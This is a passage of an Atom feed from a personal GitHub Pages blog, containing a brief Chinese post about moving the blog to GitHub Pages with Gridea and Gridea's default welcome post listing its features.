        <link href="https://boooook123.github.io/Artone.github.io/post/quan-xin-de-kai-shi/">
        </link>
        <updated>2022-10-19T00:47:07.000Z</updated>
        <summary type="html"><![CDATA[<p>服务器到期了，之前买的域名也到期了。。。<br>
于是乎<br>
全新的域名，全新的博客，又是一个全新的开始<br>
github page + Gridea，完美解决服务器续费如勒索的困扰(狂喜.jpg)</p>
]]></summary>
        <content type="html"><![CDATA[<p>服务器到期了，之前买的域名也到期了。。。<br>
于是乎<br>
全新的域名，全新的博客，又是一个全新的开始<br>
github page + Gridea，完美解决服务器续费如勒索的困扰(狂喜.jpg)</p>
<!-- more -->
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/hello-gridea/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/hello-gridea/">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="https://gridea.dev/">Gridea 主页</a><br>
<a href="https://fehey.com/">示例网站</a></p>
<h2 id="特性">特性👇</h2>
<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
<p>🏷️  你可以对文章进行标签分组</p>
<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
<p>未来，它一定会成为你离不开的伙伴</p>
<p>尽情发挥你的才华吧！</p>
<p>😘 Enjoy~</p>
]]></content>
    </entry>
</feed>